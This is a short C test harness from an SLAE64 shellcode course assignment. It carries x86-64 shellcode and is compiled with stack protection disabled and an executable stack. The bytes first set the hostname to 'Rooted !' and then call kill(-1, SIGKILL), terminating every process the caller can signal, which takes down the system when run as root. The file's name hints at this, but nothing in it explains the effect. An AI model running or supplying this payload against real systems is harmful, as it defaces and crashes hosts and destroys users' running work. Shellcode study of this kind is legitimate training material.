// Student ID   : SLAE64-1611
// Student Name : Jonathan "Chops" Crosby
// Assignment 6 : Shell Code Test File
// File Name    : hostname-killall.c

#include<stdio.h>
#include<string.h>

//compile with: gcc hostname-killall.c -o hostname-killall -fno-stack-protector -z execstack -no-pie

unsigned char code[] = \
"\x48\x31\xc0\x04\x50\x04\x5a\x49\xbb\x52\x6f\x6f\x74\x65\x64\x20\x21\x41\x53\x48\x89\xe7\x48\x89\xc6\x40\x80\xee\xa2\x0f\x05\x04\x3e\x48\x89\xf7\x40\x80\xef\x07\x48\xf7\xdf\x48\xff\xc6\x0f\x05";

main()
{
	printf("Shellcode Length:  %zu\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
